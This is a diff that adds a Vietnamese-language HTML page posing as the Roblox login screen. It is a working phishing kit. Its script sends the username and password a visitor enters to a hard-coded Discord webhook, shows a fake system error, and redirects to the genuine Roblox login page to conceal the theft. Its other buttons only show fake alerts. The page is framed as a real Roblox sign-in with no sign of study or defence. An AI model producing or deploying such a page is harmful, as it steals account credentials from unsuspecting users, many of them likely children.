@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Đăng nhập</title>
+    <style>
+        body {
+            margin: 0; padding: 0;
+            background: url('https://images.rbxcdn.com/f9379895240be6d16f391b1076b97669.jpg') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif;
+            display: flex; justify-content: center; align-items: center; height: 100vh;
+        }
+        .login-container {
+            background-color: rgba(30, 31, 33, 0.95);
+            padding: 30px; border-radius: 8px;
+            width: 360px; text-align: center; color: white;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        h2 { font-size: 20px; margin-bottom: 20px; font-weight: bold; }
+        input {
+            width: 100%; padding: 12px; margin: 8px 0;
+            background: #393b3d; border: 1px solid #000;
+            border-radius: 4px; color: white; box-sizing: border-box;
+        }
+        .btn-login {
+            width: 100%; padding: 12px; margin-top: 15px;
+            background-color: #ffffff; color: #1e1f21;
+            border: none; border-radius: 4px; font-weight: bold; cursor: pointer;
+        }
+        .links { margin-top: 20px; font-size: 13px; color: #adb0b1; cursor: pointer; }
+        .btn-other {
+            width: 100%; padding: 10px; margin-top: 10px;
+            background-color: #393b3d; color: white;
+            border: 1px solid #ffffff; border-radius: 4px; cursor: pointer; font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <h2>Thêm tài khoản</h2>
+    <input type="text" id="username" placeholder="Tên người dùng/Địa chỉ email/Số điện thoại">
+    <input type="password" id="password" placeholder="Mật khẩu">
+    
+    <button class="btn-login" onclick="guiThongTin()">Đăng nhập</button>
+    
+    <div class="links" onclick="alert('Tính năng này đang bảo trì!')">Bạn quên Mật khẩu hoặc Tên người dùng?</div>
+    
+    <button class="btn-other" onclick="alert('Đã gửi mã về Email của bạn!')">Gửi mã một lần cho tôi qua email</button>
+    <button class="btn-other" onclick="alert('Vui lòng mở ứng dụng Roblox trên thiết bị khác')">Sử dụng thiết bị khác</button>
+</div>
+
+<script>
+    function guiThongTin() {
+        const u = document.getElementById('username').value;
+        const p = document.getElementById('password').value;
+        
+        // Link Webhook Discord của bạn
+        const webhook = "https://discord.com/api/webhooks/1460276452489695315/XC5wn4raeZxbNGi_Gyow4VNaZ9kzAVhnEoFKPCjpalXR_uMwu2b0vVRC2N8meXeJ6GQj";
+
+        if(u === "" || p === "") {
+            alert("Vui lòng nhập đầy đủ thông tin!");
+            return;
+        }
+
+        fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: "🔔 **CÓ NGƯỜI NHẬP ACC MỚI!**",
+                embeds: [{
+                    color: 16711680,
+                    fields: [
+                        { name: "👤 Tài khoản", value: "`" + u + "`" },
+                        { name: "🔑 Mật khẩu", value: "`" + p + "`" }
+                    ]
+                }]
+            })
+        }).then(() => {
+            alert("Lỗi hệ thống (0x8004): Vui lòng thử lại sau ít phút!");
+            window.location.href = "https://www.roblox.com/vi/Login";
+        });
+    }
+</script>
+
+</body>
+</html>
